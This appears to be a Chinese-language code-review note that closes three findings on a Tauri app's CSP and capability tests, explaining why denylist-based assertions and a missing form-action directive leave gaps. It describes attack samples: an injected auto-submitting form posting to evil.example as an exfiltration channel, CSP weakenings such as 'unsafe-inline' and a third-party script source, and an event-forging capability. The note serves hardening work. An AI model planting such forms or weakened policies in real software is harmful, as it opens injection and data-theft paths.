关闭本轮 WR-01（≡ 01-VERIFICATION.md `### Anti-Patterns Found` 表里的 WR-A）、本轮 WR-02，以及上轮 WR-09：

- **本轮 WR-01 / WR-A**：`src/lib/tauri-security.test.ts` 第 47-59 行自称把断言② 从「字面量在」升级成「面没被扩宽」。它没有。第 49-55 行是一个四项 denylist（`*` / `http:` / `https:` / `data:` / `*.` 前缀）。verifier 与评审各自独立复算过：`script-src 'self' 'unsafe-inline'`、`script-src 'self' https://cdn.evil.example`、`connect-src *` 三种被削弱的策略**全部通过**。其中 `'unsafe-inline'` 是最可能的那次回归——它正是 CSP 挡住某个东西时被顺手加上的那一项，而它完整地把这条测试想关掉的 XSS 路径装了回去（Phase 3+ 渲染外部 agent 写的 Markdown）。`connect-src *` 是一条不受约束的外泄通道，而它**根本没被检查**。这个文件自己的论证（「一个把 `csp` 改回 `null` 的 diff 是一次代码评审最容易放过的形状」）逐字适用于一个只加一个词的 diff。
- **本轮 WR-02**：`form-action` 是少数**没有 `default-src` 兜底**的指令之一。当前策略下，一个被注入的 `<form action="https://evil.example" method="POST">` 加自动提交是一条可用的外泄通道，尽管 `connect-src` / `img-src` / `script-src` 都收在 `'self'`。这条 CSP 是为内容注入威胁写的，关掉脚本与网络两条路却留着表单那条，是一个不完整的边界。
- **上轮 WR-09**：`src/lib/capabilities.test.ts` 第 26-32 行的注释声称断言最小权限，机制却是六个前缀的固定 denylist。这些前缀之外的一切**无声通过**——包括 `core:event:allow-emit`（它会让前端脚本能伪造 `prism://changed` 事件直接注进失效管线）以及后续 phase 会想加的每一个 `core:app:*` / `core:path:*` / `plugin:*`。当前授予集只有两条，精确相等的成本是零而强度严格更高。

Purpose: 三条是同一个形状——**correct guards protected by non-discriminating tests**（本轮评审自己点破的主线）。配置侧现在是紧的；守着它的断言不是。

Output: 三份逐指令/逐权限精确相等的断言，加两条补齐的 CSP 指令。
